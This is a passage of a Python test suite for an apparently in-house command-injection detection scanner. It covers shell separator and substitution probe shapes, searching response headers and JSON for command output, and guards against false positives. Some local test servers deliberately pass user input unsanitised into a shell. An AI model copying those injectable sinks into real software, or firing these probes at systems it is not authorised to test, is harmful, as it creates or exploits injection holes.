    shape that reaches them there. These lock that distinction in, because it is
    the reason the rung exists."""

    def setUp(self):
        self.gen = RCEKit()
        self.rec = make_record(environment="unix", context="raw")

    def _payloads(self, context, config=None, method=ReflectedMath):
        import random as _random
        rec = make_record(environment="unix", context=context)
        return [p.payload for p in method(self.gen, config or {}).build_probes(
            rec, _random.Random(5))]

    # -- shape parsing -------------------------------------------------------

    def test_auto_and_empty_mean_the_whole_ladder(self):
        for value in (None, "", "auto"):
            self.assertIsNone(rcekit.parse_sink_shapes(value), value)

    def test_named_rungs_are_parsed_in_order(self):
        self.assertEqual(rcekit.parse_sink_shapes("sq,subshell"), ("sq", "subshell"))
        self.assertEqual(rcekit.parse_sink_shapes(" raw , sep "), ("raw", "sep"))

    def test_an_unknown_rung_is_refused_by_name(self):
        # Silently narrowing a run to nothing because of a typo would report a
        # clean negative from a run that tested almost nothing.
        with self.assertRaises(ValueError) as ctx:
            rcekit.parse_sink_shapes("sq,bogus")
        self.assertIn("bogus", str(ctx.exception))

    def test_every_rung_has_a_plan_line(self):
        lines = rcekit.sink_shape_plan(None)
        self.assertEqual(len(lines), len(rcekit.SINK_SHAPE_RUNGS))
        for rung in rcekit.SINK_SHAPE_RUNGS:
            self.assertTrue(any(f" {rung} " in line for line in lines), rung)

    def test_the_plan_lists_only_the_selected_rungs(self):
        lines = rcekit.sink_shape_plan(("sq", "subshell"))
        self.assertEqual(len(lines), 2)
        self.assertTrue(any(" sq " in line for line in lines))
        self.assertFalse(any(" chain " in line for line in lines))

    # -- substitution contexts ----------------------------------------------

    def test_substitution_contexts_get_no_separator(self):
        # $(...) does not break out of a running command, it is an expression
        # evaluated where it sits. A leading ';' would be a syntax error inside
        # the substitution.
        for context, opener in (("shell_subshell", "$("), ("shell_backtick", "`")):
            for payload in self._payloads(context):
                self.assertTrue(payload.startswith(opener), payload)
                self.assertFalse(payload.startswith(("; ", "| ", "&& ")), payload)

    def test_substitution_probes_still_carry_an_unforgeable_expected_value(self):
        import random as _random
        rec = make_record(environment="unix", context="shell_subshell")
        for probe in ReflectedMath(self.gen).build_probes(rec, _random.Random(5)):
            self.assertNotIn(probe.expected, probe.payload)

    def test_the_backtick_context_drops_shapes_that_carry_a_backtick(self):
        # Backticks do not nest: a body carrying its own would close the outer
        # substitution early, so the probe could only ever come back negative.
        for payload in self._payloads("shell_backtick"):
            self.assertEqual(payload.count("`"), 2, payload)

    def test_the_subshell_context_keeps_them_because_it_nests(self):
        # $( ) does nest, so it carries every shape including the backtick one —
        # dropping it there would be a lost probe for no reason.
        self.assertTrue(any("`expr " in p for p in self._payloads("shell_subshell")))

    def test_substitution_carriers_are_added_under_auto(self):
        carriers = self.gen._quoted_shell_carriers([self.rec], {("unix", "raw")}, {})
        contexts = {c.context for c in carriers}
        self.assertIn("shell_subshell", contexts)
        self.assertIn("shell_backtick", contexts)
        self.assertIn("shell_single_quoted", contexts)

    def test_naming_rungs_narrows_which_carriers_are_added(self):
        carriers = self.gen._quoted_shell_carriers(
            [self.rec], {("unix", "raw")}, {"sink_shapes": ("sq",)})
        self.assertEqual({c.context for c in carriers}, {"shell_single_quoted"})

    def test_explicit_contexts_still_suppress_the_extra_carriers(self):
        self.assertEqual(
            self.gen._quoted_shell_carriers([self.rec], {("unix", "raw")},
                                            {"contexts_explicit": True}), [])

    # -- the raw rung --------------------------------------------------------

    def test_the_ladder_sends_the_bare_command_alongside_the_separators(self):
        # A qx/$input/ sink used to need --sink-raw, so it reported clean unless
        # the operator already suspected its shape. The ladder tries it.
        payloads = self._payloads("raw")
        self.assertTrue(any(p.startswith("; ") for p in payloads))
        self.assertTrue(any(p.startswith("echo ") for p in payloads),
                        "the raw rung must send a bare command too")

    def test_sink_raw_still_narrows_to_the_bare_command_only(self):
        payloads = self._payloads("raw", {"sink_raw": True})
        self.assertTrue(payloads)
        for payload in payloads:
            self.assertFalse(payload.lstrip().startswith((";", "|", "&")), payload)

    def test_dropping_the_raw_rung_drops_the_bare_command(self):
        # Every payload stays separator-led. The space-free shape trims the
        # separator's trailing space (a space-stripping sink would remove it
        # anyway), so the check is on the separator character, not the spelling.
        payloads = self._payloads("raw", {"sink_shapes": ("sep", "chain")})
        self.assertTrue(payloads)
        for payload in payloads:
            self.assertTrue(payload.startswith((";", "|", "&")), payload)

    def test_every_shell_method_gets_the_raw_rung(self):
        # The rung used to live only in _wrap_variants, so it reached
        # `reflected` and nothing else: file/time/oob read the separator list
        # directly and never sent a bare command to a whole-command sink.
        import random as _random
        config = {"webroot": "/var/www", "web_base_url": "http://t",
                  "time_base": 2, "oob_host": "x.example"}
        for name, cls in (("reflected", ReflectedMath), ("file", FileBased),
                          ("oob", rcekit.OobCallback)):
            probes = cls(self.gen, config).build_probes(self.rec, _random.Random(1))
            self.assertTrue(any(p.payload.startswith(("echo ", "sleep ", "curl ", "awk ",
                                                      "expr ", "wget ", "nslookup ", "host "))
                                for p in probes),
                            f"{name} sends no bare command under the full ladder")

    def test_the_timing_method_reaches_the_raw_rung_in_its_second_wave(self):
        # time screens in two waves to avoid paying a sleep per separator up
        # front, so the raw candidate lands in the second wave rather than the
        # first. It must still be reached.
        import random as _random
        method = ParametricTime(self.gen, {"time_base": 2})
        first = method.build_probes(self.rec, _random.Random(1))
        series = [(p, Observation(status=200, body="", elapsed=0.1)) for p in first]
        second = method.next_probes(series)
        self.assertIn(None, {p.separator for p in second})
        self.assertTrue(any(p.payload.startswith("sleep ") for p in second))

    def test_narrowing_to_raw_leaves_every_method_with_probes(self):
        # Narrowing to `raw` used to empty the separator list, so file/time/oob
        # built ZERO probes -- and an aggregate method judging zero samples
        # answered `negative`. A run that tested nothing must never read as
        # "not vulnerable".
        import random as _random
        config = {"webroot": "/var/www", "web_base_url": "http://t", "time_base": 2,
                  "oob_host": "x.example", "sink_shapes": ("raw",)}
        for name, cls in (("reflected", ReflectedMath), ("file", FileBased),
                          ("time", ParametricTime), ("oob", rcekit.OobCallback)):
            probes = cls(self.gen, config).build_probes(self.rec, _random.Random(1))
            self.assertTrue(probes, f"{name} built no probes for --sink-shape raw")

    def test_a_method_that_built_no_probes_reports_nothing_rather_than_negative(self):
        # The engine-level guard behind that. An aggregate method's honest
        # answer to an empty series ("no delay was observed") is `negative`, so
        # the row must not be emitted at all -- which is what lets the engine's
        # own nothing-tested path fire instead.
        # An explicit --contexts suppresses the sq carrier, and naming only the
        # sq rung leaves the raw carrier with no separators and no raw rung —
        # so nothing anywhere builds a probe.
        with local_target(lambda *a: (200, "ok")) as base:
            results = self.gen.run_detection(
                [make_record(environment="unix", context="raw")],
                url=f"{base}/?host=FUZZ", methods=["time"],
                config={"time_base": 1, "sink_shapes": ("sq",), "contexts_explicit": True})
        self.assertEqual(results, [],
                         "a carrier with no probes must not produce a verdict")
        self.assertEqual(rcekit.overall_detection_verdict(results), "nothing-tested")

    # -- the effective ladder ------------------------------------------------

    def test_effective_shapes_drop_raw_when_separators_are_pinned(self):
        self.assertNotIn("raw", rcekit.effective_sink_shapes({"separators": ["| "]}))
        self.assertIn("raw", rcekit.effective_sink_shapes({}))

    def test_effective_shapes_drop_context_rungs_when_contexts_are_explicit(self):
        # An explicit --contexts suppresses the added carriers, so those rungs
        # never get anything to ride on.
        effective = rcekit.effective_sink_shapes({"contexts_explicit": True})
        for rung in ("sq", "dq", "subshell"):
            self.assertNotIn(rung, effective)
        self.assertIn("sep", effective)

    def test_sink_raw_reduces_the_effective_ladder_to_raw(self):
        self.assertEqual(rcekit.effective_sink_shapes({"sink_raw": True}), ("raw",))

    def test_an_explicit_shape_choice_survives_the_other_narrowings(self):
        self.assertEqual(
            rcekit.effective_sink_shapes({"separators": ["| "], "sink_shapes": ("sep", "raw")}),
            ("sep", "raw"))

    def test_the_printed_plan_matches_what_the_engine_will_do(self):
        # The plan is presented as an audit of the traffic about to be sent, so
        # printing the raw flag would describe a run that is not the one about
        # to happen.
        config = {"separators": ["| "]}
        self.assertEqual(ReflectedMath(self.gen, config)._raw_rung_selected(),
                         "raw" in rcekit.effective_sink_shapes(config))
        lines = rcekit.sink_shape_plan(rcekit.effective_sink_shapes(config))
        self.assertFalse(any(" raw " in line for line in lines), lines)

    # -- separator rungs -----------------------------------------------------

    def test_naming_separators_suppresses_the_raw_rung(self):
        # Naming the separators is a statement that the sink is separator-led,
        # so a bare command is not one of the shapes the operator asked for.
        payloads = self._payloads("raw", {"separators": ["| "]})
        self.assertTrue(payloads)
        for payload in payloads:
            self.assertTrue(payload.startswith("|"), payload)

    def test_naming_the_raw_rung_overrides_that(self):
        # --sink-shape is the more specific say, so it wins over the inference.
        payloads = self._payloads("raw", {"separators": ["| "],
                                          "sink_shapes": ("sep", "raw")})
        self.assertTrue(any(p.startswith("echo ") for p in payloads), payloads)

    def test_separator_rungs_select_their_own_separators(self):
        method = ReflectedMath(self.gen, {"sink_shapes": ("chain",)})
        self.assertEqual(method._separators("unix"), ("| ", "|| ", "&& "))
        method = ReflectedMath(self.gen, {"sink_shapes": ("sep", "newline")})
        self.assertEqual(method._separators("unix"), ("; ", "\n"))

    def test_selecting_no_separator_rung_empties_the_sweep(self):
        # With only sq/subshell selected, a separator-led probe is a request
        # that cannot confirm.
        method = ReflectedMath(self.gen, {"sink_shapes": ("sq", "subshell")})
        self.assertEqual(method._separators("unix"), ())

    def test_explicit_separators_still_win_outright(self):
        method = ReflectedMath(self.gen, {"sink_shapes": ("chain",), "separators": ["; "]})
        self.assertEqual(method._separators("unix"), ("; ",))

    def test_windows_rungs_map_to_cmd_vocabulary(self):
        # ';' is not a cmd.exe separator, so a rung name must resolve against
        # the environment's own table rather than a global one.
        method = ReflectedMath(self.gen, {"sink_shapes": ("sep",)})
        self.assertEqual(method._separators("windows"), (" & ",))
        method = ReflectedMath(self.gen, {"sink_shapes": ("newline",)})
        self.assertEqual(method._separators("windows"), ())

    def test_auto_is_unchanged_for_the_separator_sweep(self):
        self.assertEqual(ReflectedMath(self.gen)._separators("unix"),
                         ReflectedMath.DEFAULT_SEPARATORS["unix"])

    # -- end to end ----------------------------------------------------------

    def test_a_quote_filtered_double_quoted_sink_needs_the_substitution_rung(self):
        # The acceptance case. The sink puts the value inside double quotes and
        # strips the quote character, so the dq break-out cannot close it. The
        # file method's core is a redirect, which is inert inside those quotes —
        # a command substitution is the only shape that reaches it.
        import os
        import tempfile

        webroot = shell_writable_dir()

        def route(method, path, params, headers, body):
            if path.startswith("/files/"):
                served = os.path.join(webroot, os.path.basename(path))
                if os.path.exists(served):
                    with open(served) as handle:
                        return 200, handle.read()
                return 404, "not found"
            raw = params.get("host", "").replace('"', "")
            pipe = sh_popen('echo PING "%s" 2>&1' % raw)
            out = pipe.read()
            pipe.close()
            return 200, out

        with local_target(route) as base:
            config = {"webroot": webroot, "web_base_url": f"{base}/files"}
            without = self.gen.run_detection(
                [self.rec], url=f"{base}/?host=FUZZ", methods=["file"],
                config=dict(config, sink_shapes=("sep", "chain", "newline", "sq", "dq", "raw")),
                timeout=15)
            with_ladder = self.gen.run_detection(
                [self.rec], url=f"{base}/?host=FUZZ", methods=["file"],
                config=config, timeout=15)

        self.assertFalse([r for r in without if r["verdict"] == "executed"],
                         "precondition: without the substitution rung this sink reads clean")
        confirmed = [r for r in with_ladder if r["verdict"] == "executed"]
        self.assertTrue(confirmed, "the substitution rung must reach a quote-filtered sink")
        self.assertTrue({r["context"] for r in confirmed} <= rcekit.SUBSTITUTION_CONTEXTS)

    def test_a_clean_target_stays_negative_through_every_rung(self):
        # Widening the ladder must not widen what gets confirmed.
        with local_target(lambda *a: (200, "<html>static 12345678</html>")) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/?host=FUZZ", methods=["reflected"])
        self.assertFalse([r for r in results if r["verdict"] == "executed"])


class ResponseChannelTestCase(unittest.TestCase):
    """The computed value is looked for in every channel of the response, not the
    body alone.

    A sink whose output lands in a debug header, a Set-Cookie, a redirect target,
    an HTTP reason phrase or a leaf of a JSON error envelope is a genuinely
    vulnerable target that the body-only matcher reported as `negative`. These
    lock in that the sweep finds it, that the control differential still governs
    the verdict, and that widening the search did not open a false-positive path
    through numeric transport headers."""

    def setUp(self):
        self.gen = RCEKit()
        self.rec = make_record(environment="unix", context="raw")
        self.method = ReflectedMath(self.gen)

    def _probe(self, seed=11):
        import random as _random
        return self.method.build_probes(self.rec, _random.Random(seed))[0]

    # -- channel construction ------------------------------------------------

    def test_body_is_always_the_first_channel(self):
        # Order matters for the evidence line: the common case must keep naming
        # no channel at all, which only holds if the body is searched first.
        channels = self.gen._response_channels([("X-Debug", "v")], "hello")
        self.assertEqual(channels[0], ("response body", "hello"))

    def test_application_headers_and_cookie_values_become_channels(self):
        channels = dict(self.gen._response_channels(
            [("X-Debug-Result", "42"), ("Set-Cookie", "last=99; Path=/; HttpOnly")], ""))
        self.assertEqual(channels["header X-Debug-Result"], "42")
        self.assertEqual(channels["header Set-Cookie"], "last=99; Path=/; HttpOnly")
        # The cookie's value is also exposed on its own, so evidence can name the
        # cookie rather than the whole Set-Cookie line.
        self.assertEqual(channels["cookie last"], "99")

    def test_transport_headers_are_excluded(self):
        # Content-Length and friends are generated by the transport layer, never
        # by the application. Searching them would let a bare arithmetic result
        # collide with a byte count and confirm an execution that never happened.
        channels = dict(self.gen._response_channels(
            [("Content-Length", "417"), ("Date", "Mon, 1 Jan 2035 00:00:00 GMT"),
             ("ETag", "12345"), ("Server", "nginx")], ""))
        for absent in ("header Content-Length", "header Date", "header ETag"):
            self.assertNotIn(absent, channels)
        self.assertIn("header Server", channels)

    def test_reason_phrase_and_redirect_target_become_channels(self):
        channels = dict(self.gen._response_channels(
            [], "", reason="Internal Server Error",
            final_url="http://t/landed?x=1", requested_url="http://t/start"))
        self.assertEqual(channels["reason phrase"], "Internal Server Error")
        self.assertEqual(channels["redirect target"], "http://t/landed?x=1")

    def test_redirect_channel_is_absent_when_no_redirect_happened(self):
        channels = dict(self.gen._response_channels(
            [], "", final_url="http://t/same", requested_url="http://t/same"))
        self.assertNotIn("redirect target", channels)

    def test_json_leaves_are_addressed_by_path(self):
        body = json.dumps({"error": {"detail": "cannot render 2058898001"},
                           "items": [{"v": 7}], "ok": False, "none": None})
        channels = dict(self.gen._json_leaf_channels(body))
        self.assertEqual(channels["JSON field error.detail"], "cannot render 2058898001")
        self.assertEqual(channels["JSON field items[0].v"], "7")
        # Booleans and nulls carry no computed value, so they are not channels.
        self.assertNotIn("JSON field ok", channels)
        self.assertNotIn("JSON field none", channels)

    def test_json_leaf_channel_decodes_escaped_values(self):
        # A value the encoder escaped is invisible to a substring search of the
        # serialised body; parsing first is what makes it findable.
        body = r'{"msg": "id=20\u0035\u0038"}'
        self.assertNotIn("2058", body)
        self.assertIn(("JSON field msg", "id=2058"), self.gen._json_leaf_channels(body))

    def test_non_json_body_yields_no_leaf_channels(self):
        self.assertEqual(self.gen._json_leaf_channels("<html>not json</html>"), [])

    def test_deeply_nested_json_costs_a_channel_not_the_request(self):
        # json.loads' scanner recurses in C and raises RecursionError on a deeply
        # nested body. Channels are built inside the delivery try/except, so an
        # escaping exception would report a response that arrived perfectly well
        # as a failed request -- letting a target hide a live sink behind a
        # thousand nested arrays. Losing the JSON leaves is the acceptable cost;
        # losing the response is not.
        nesting = deep_json_nesting()
        deep = "[" * nesting + '"x"' + "]" * nesting
        self.assertEqual(self.gen._json_leaf_channels(deep), [])
        channels = self.gen._response_channels([("X-Debug", "v")], deep)
        self.assertEqual(channels[0], ("response body", deep))
        self.assertIn(("header X-Debug", "v"), channels)

    def test_a_recursion_error_from_the_json_parser_costs_only_its_channels(self):
        # The parser's own limit moved between interpreter versions, so the
        # handling is pinned deterministically rather than through whichever
        # nesting depth happens to break the current CPython.
        import unittest.mock as mock
        with mock.patch("rcekit.json.loads", side_effect=RecursionError("too deep")):
            self.assertEqual(self.gen._json_leaf_channels('{"a": 1}'), [])
            channels = self.gen._response_channels([("X-Debug", "v")], '{"a": 1}')
        self.assertEqual(channels[0], ("response body", '{"a": 1}'))
        self.assertIn(("header X-Debug", "v"), channels)

    def test_a_marked_json_response_loses_its_leaf_channels(self):
        # NOT an endorsement of this behaviour, and not a target to preserve.
        # It pins the response half of the byte-order-mark gap 3.1.2 closed on
        # the request side, so that closing this half is a deliberate act with a
        # failing test in front of it rather than something done by accident.
        bom = rcekit._BOM
        body = '{"out": "RKAAAAA1234RKBBBBB"}'
        self.assertEqual(self.gen._json_leaf_channels(body),
                         [("JSON field out", "RKAAAAA1234RKBBBBB")])
        self.assertEqual(self.gen._json_leaf_channels(bom + body), [],
                         "json.loads rejects the mark outright")

    def test_a_mark_costs_the_channel_name_for_a_value_peeling_can_reach(self):
        # The common case, and the reason this is usually a loss of precision
        # rather than of coverage: the body channel carries the whole document
        # and _encoded_search peels the escape out of it.
        #
        # The escapes below are built from chr(92) rather than written as
        # literals on purpose. An editor -- or a tool writing this file -- that
        # interprets a backslash-u sequence turns the escaped form into the
        # character itself, and the assertion then passes while testing nothing.
        bs = chr(92)
        bom = rcekit._BOM
        body = '{"msg": "id=20' + bs + 'u0035' + bs + 'u0038"}'
        self.assertNotIn("2058", body)
        for candidate in (body, bom + body):
            channels = self.gen._response_channels(
                [("Content-Type", "application/json")], candidate)
            self.assertEqual(self.method._search_channels("2058", channels),
                             "response body", candidate)

    def test_a_mark_costs_the_finding_for_a_value_only_the_leaf_can_reach(self):
        # The near neighbour of the test above, and the one that corrects it.
        # JSON's `\/` escape and a surrogate pair are not among the forms
        # _encoded_search peels, so the parsed leaf is the only channel that
        # reaches such a value -- and a marked response has no leaves. This is a
        # lost confirmation, not a lost label.
        #
        # No method is exposed to it today, because every `expected` value the
        # methods build is tag-bracketed decimal digits and no conforming JSON
        # encoder escapes [A-Za-z0-9]. That is a property of the probes rather
        # than of the channel, so it is asserted over the whole registry in
        # test_no_method_builds_a_non_alphanumeric_expected_value below --
        # here it is only the reason this loss costs nothing yet.
        import warnings
        bs = chr(92)
        bom = rcekit._BOM
        for body, wanted in (
                ('{"p": "RK' + bs + '/1234' + bs + '/ZZ"}', "RK/1234/ZZ"),
                ('{"p": "RK' + bs + 'ud83d' + bs + 'ude00ZZ"}',
                 "RK" + chr(0x1F600) + "ZZ")):
            self.assertNotIn(wanted, body)
            # `\/` is a valid JSON escape and an invalid Python one, so handing
            # this body to _encoded_search's `unicode_escape` peeling warns on
            # 3.14. Harmless -- that decode sits in its own try/except, so the
            # candidate is skipped and the search keeps its other layers -- but
            # it is the test's own data producing it, so it is kept out of the
            # suite's output rather than left as noise for everyone.
            with warnings.catch_warnings():
                warnings.simplefilter("ignore", DeprecationWarning)
                clean = self.gen._response_channels(
                    [("Content-Type", "application/json")], body)
                found_clean = self.method._search_channels(wanted, clean)
                marked = self.gen._response_channels(
                    [("Content-Type", "application/json")], bom + body)
                found_marked = self.method._search_channels(wanted, marked)
            self.assertEqual(found_clean, "JSON field p", body)
            self.assertIsNone(found_marked, body)

    def test_no_method_builds_a_non_alphanumeric_expected_value(self):
        """The reason the leaf-only loss above costs nothing today.

        Every ``expected`` value the methods build is tag-bracketed decimal
        digits or a lowercase token, and no conforming JSON encoder escapes
        ``[A-Za-z0-9]`` -- so none of them can land in the leaf-only case.

        That is a property of the *probes*, not of the channel, so it is
        asserted over the whole registry. An earlier version of this test read
        one probe of ``ReflectedMath`` while the note beside it claimed
        something about every method, which is a guard narrower than its own
        docstring: a change to ``EvalExpr``, to a file or OOB token, or a method
        added later would never have reached it.

        ``time`` and ``boolean`` are named rather than skipped. Both search no
        value in a response -- one measures a delay, the other compares response
        shape -- so an empty ``expected`` is right for them and only for them. A
        third method falling silent here is a change worth looking at, not one to
        absorb."""
        import random as _random
        searches_no_value = {"time", "boolean"}
        # Enough configuration that every method is willing to build: `file`
        # and `write` are gated on their paths, the callback methods on a host.
        config = {
            "oob_host": "oob.test", "oob_listener": None,
            "file_write_path": "/var/www/html", "file_read_url": "http://t.example/{name}",
            "write_read_url": "http://t.example/probe.jsp", "probe_depth": "full",
        }
        checked = 0
        for name, cls in rcekit.DETECTION_METHODS.items():
            method = cls(self.gen, config)
            probes = []
            for environment in ("unix", "windows", "powershell", "java", "php",
                                "nodejs", "dotnet"):
                for context in ("raw", "json", "html", "xml", "yaml"):
                    record = make_record(environment=environment, context=context,
                                         mode="detection", category="detection")
                    if method.applicable(record):
                        probes.extend(method.build_probes(record, _random.Random(7)))
            # A loop that built nothing for a method would report coverage it
            # does not have, which is the failure this whole file is about.
            self.assertTrue(probes, f"{name} built no probes, so it was not checked")
            values = [p.expected for p in probes if p.expected]
            if name in searches_no_value:
                self.assertEqual(values, [], f"{name} is listed as searching no value")
                continue
            self.assertTrue(values, f"{name} built no expected value to check")
            for value in values:
                self.assertTrue(
                    value.isalnum(),
                    f"{name} builds expected={value!r}, which is not alphanumeric "
                    "and so could be lost to a JSON escape that the encoded-value "
                    "search does not peel -- see the leaf-only test above")
                checked += 1
        self.assertGreater(checked, 500, "the sweep should cover the whole registry")

    def test_a_marked_json_response_takes_the_weaker_shape_reading(self):
        # The other half, and the reason the first is left alone: this function
        # is the input to `boolean`'s verdict. Stripping the mark in one and not
        # the other would make the two disagree about what a response is, which
        # is the shape of the request-side bug. Pinned so that moving them
        # together is a choice someone makes on purpose, with live-target
        # evidence -- `boolean` has no bench case, so there is nothing yet to
        # validate it against.
        bom = rcekit._BOM
        body = '{"rows": [{"a": 1}, {"a": 2}]}'
        self.assertEqual(rcekit.response_shape(200, body)[:2], ("json", 200))
        self.assertEqual(rcekit.response_shape(200, bom + body)[:2], ("text", 200))

    def test_leaf_walk_is_bounded_by_depth_and_count(self):
        nested = json.dumps({"a": {"b": {"c": "deep"}}})
        self.assertEqual(self.gen._json_leaf_channels(nested, max_depth=1), [])
        self.assertTrue(self.gen._json_leaf_channels(nested, max_depth=8))
        wide = json.dumps({"k%d" % i: i for i in range(50)})
        self.assertEqual(len(self.gen._json_leaf_channels(wide, limit=10)), 10)

    def test_channel_construction_never_turns_a_response_into_an_error(self):
        # Belt and braces for the same failure mode: whatever goes wrong while
        # building channels, a delivered response keeps its body channel.
        class Hostile:
            reason = "OK"
            url = "http://t/x"

            @property
            def headers(self):
                raise RuntimeError("boom")

        self.assertEqual(self.gen._channels_from_response(Hostile(), "hello", "http://t/x")[0],
                         ("response body", "hello"))

    # -- verdicts ------------------------------------------------------------

    def test_confirms_a_value_carried_only_by_a_header(self):
        probe = self._probe()
        obs = Observation(200, "nothing here", control_body="idle",
                          channels=[("response body", "nothing here"),
                                    ("header X-Debug-Result", f"out={probe.expected}")],
                          control_channels=[("response body", "idle")])
        verdict = self.method.confirm(obs, probe)
        self.assertEqual(verdict.status, "executed")
        # Reproducible by hand: the evidence must say where to look.
        self.assertIn("header X-Debug-Result", verdict.evidence)

    def test_body_match_evidence_is_unchanged(self):
        # Widening the search must not change what a body-carried confirmation
        # reads like in a report.
        probe = self._probe()
        verdict = self.method.confirm(
            Observation(200, f"out {probe.expected}", control_body="idle"), probe)
        self.assertEqual(verdict.status, "executed")
        self.assertNotIn(" in ", verdict.evidence.split("(")[0])

    def test_confirms_a_value_nested_in_a_json_error_envelope(self):
        import random as _random
        probe = EvalExpr(self.gen).build_probes(self.rec, _random.Random(3))[0]
        body = json.dumps({"error": {"detail": f"evaluated to {probe.expected}"}})
        channels = ([("response body", body)]
                    + self.gen._json_leaf_channels(body))
        verdict = EvalExpr(self.gen).confirm(
            Observation(500, body, control_body="{}", channels=channels,
                        control_channels=[("response body", "{}")]), probe)
        self.assertEqual(verdict.status, "executed")

    def test_control_carrying_the_value_in_any_channel_blocks_confirmation(self):
        # Invariant: `executed` requires the value to be absent from the
        # payload-free control. A control that already carries it means the value
        # is not attributable to execution, wherever it surfaced.
        probe = self._probe()
        obs = Observation(200, "nothing", control_body="idle",
                          channels=[("response body", "nothing"),
                                    ("header X-Echo", probe.expected)],
                          control_channels=[("response body", "idle"),
                                            ("header X-Echo", probe.expected)])
        verdict = self.method.confirm(obs, probe)
        self.assertEqual(verdict.status, "inconclusive")
        self.assertIn("header X-Echo", verdict.evidence)

    def test_value_absent_from_every_channel_stays_negative(self):
        probe = self._probe()
        obs = Observation(200, "nothing", control_body="idle",
                          channels=[("response body", "nothing"),
                                    ("header X-Debug", "unrelated")],
                          control_channels=[("response body", "idle")])
        self.assertEqual(self.method.confirm(obs, probe).status, "negative")

    def test_a_numeric_transport_header_cannot_confirm(self):
        # A boundary-fenced expected value is a bare number, and Content-Length
        # is a bare number too. Excluding transport headers is what keeps that
        # collision from reading as execution.
        #
        # The probe is built here rather than found among `reflected`'s, which
        # no longer ships one: `EvalExpr` still matches a bare product
        # boundary-fenced, so the collision this test exists for is live and
        # the shape of probe that meets it has to come from somewhere.
        probe = Probe(payload="whatever", expected="937744", boundary=True)
        channels = self.gen._response_channels(
            [("Content-Length", probe.expected)], "nothing here")
        verdict = self.method.confirm(
            Observation(200, "nothing here", control_body="idle", channels=channels,
                        control_channels=[("response body", "idle")]), probe)
        self.assertEqual(verdict.status, "negative")

    def test_channels_default_to_the_body_when_absent(self):
        # An Observation built from a body alone must behave exactly as it did
        # before channels existed.
        probe = self._probe()
        self.assertEqual(
            self.method.confirm(
                Observation(200, f"x {probe.expected} y", control_body="idle"), probe).status,
            "executed")

    def test_file_method_control_differential_covers_every_channel(self):
        import random as _random
        fb = FileBased(self.gen, {"webroot": "/var/www", "web_base_url": "http://t"})
        probe = fb.build_probes(self.rec, _random.Random(4))[0]
        obs = Observation(200, "ok", followup_body=probe.expected,
                          control_channels=[("response body", "idle"),
                                            ("header X-Echo", probe.expected)])
        self.assertEqual(fb.confirm(obs, probe).status, "inconclusive")

    # -- end to end ----------------------------------------------------------

    def test_header_only_sink_confirms_end_to_end(self):
        # The whole point, against a real socket: a sink that puts command output
        # in a response header and nothing in the body used to report `negative`.
        import os

        def route(method, path, params, headers, body):
            pipe = sh_popen("echo " + params.get("host", "") + " 2>&1")
            out = pipe.read()
            pipe.close()
            return 200, "<html>no output here</html>", [("X-Cmd-Out", out.replace("\n", " "))]

        with local_target(route) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/hdr?host=FUZZ", methods=["reflected"])
        confirmed = [r for r in results if r["verdict"] == "executed"]
        self.assertTrue(confirmed, "a header-only sink must confirm")
        self.assertTrue(any("header X-Cmd-Out" in r["detail"] for r in confirmed))

    def test_non_2xx_body_still_confirms_end_to_end(self):
        # Many evaluators surface the computed value only in a 500 stack trace.
        # An early exit on status would suppress that whole class silently.
        import os

        def route(method, path, params, headers, body):
            pipe = sh_popen("echo " + params.get("host", "") + " 2>&1")
            out = pipe.read()
            pipe.close()
            return 500, "Traceback: rendering failed\n" + out

        with local_target(route) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/err?host=FUZZ", methods=["reflected"])
        self.assertTrue([r for r in results if r["verdict"] == "executed"],
                        "a 500 response carrying the computed value must confirm")

    def test_deeply_nested_json_does_not_silence_detection_end_to_end(self):
        # The evasion this guards against: a target that buries its response in
        # deep JSON would make every probe report `error` -- "never reached the
        # target" -- and a live sink would read as untestable.
        import os

        nesting = deep_json_nesting()

        def route(method, path, params, headers, body):
            pipe = sh_popen("echo " + params.get("host", "") + " 2>&1")
            out = pipe.read()
            pipe.close()
            return 200, "[" * nesting + json.dumps(out) + "]" * nesting

        with local_target(route) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/deep?host=FUZZ", methods=["reflected"])
        self.assertFalse([r for r in results if r["verdict"] == "error"],
                         "a delivered response must never be reported as a delivery failure")
        self.assertTrue([r for r in results if r["verdict"] == "executed"],
                        "the body channel still carries the computed value")

    def test_a_clean_target_stays_negative_across_all_channels(self):
        # False-positive resistance, restated for the wider sweep: a target that
        # never executes anything must not confirm through any channel.
        def route(method, path, params, headers, body):
            return 200, "<html>static page 12345678</html>", [
                ("X-Request-Id", "abc-123"), ("Set-Cookie", "sid=deadbeef; Path=/")]

        with local_target(route) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/safe?host=FUZZ", methods=["reflected", "eval"])
        self.assertFalse([r for r in results if r["verdict"] == "executed"],
                         "a non-executing target must not confirm through any channel")


class SinkEnvDialectTestCase(unittest.TestCase):
    """The sink shell: which dialect a probe is written in.

    `$((a+b))`, `sleep` and `$(echo TAG)` are POSIX constructs. On cmd.exe or
    PowerShell they are inert literal text, so a probe written in the wrong
    dialect costs a request and can only ever come back negative. The dialect
    was previously inferred from the corpus environment alone, which put every
    `windows` carrier -- including the one whose context is literally named
    `powershell` -- on the cmd.exe core.

    The PowerShell shapes asserted here were each validated against pwsh 7.4
    before being written down; the tests pin the shapes, not the shell."""

    def setUp(self):
        self.gen = RCEKit()

    # -- which dialect a carrier gets ----------------------------------------

    def test_the_dialect_follows_the_carrier(self):
        cases = [
            (dict(environment="unix", context="raw"), "unix"),
            (dict(environment="php", context="raw"), "unix"),
            (dict(environment="windows", context="raw"), "windows"),
            (dict(environment="windows", context="windows_cmd"), "windows"),
            (dict(environment="windows", context="unix_shell"), "windows"),
            (dict(environment="windows", context="powershell"), "powershell"),
            (dict(environment="dotnet", context="powershell"), "powershell"),
            (dict(environment="dotnet", context="windows_cmd"), "windows"),
            (dict(environment="dotnet", context="raw"), "unix"),
        ]
        for overrides, expected in cases:
            with self.subTest(**overrides):
                self.assertEqual(
                    rcekit.sink_env_for(make_record(**overrides), {}), expected)

    def test_a_powershell_carriers_breakouts_stay_powershell(self):
        # The quote and substitution carriers are built by replacing the
        # context, so re-deriving the dialect from the environment alone would
        # hand a PowerShell carrier's break-outs to cmd.exe. That is the defect
        # this ordering exists to prevent, so it is pinned rather than implied.
        for context in ("shell_single_quoted", "shell_double_quoted", "shell_subshell"):
            with self.subTest(context=context):
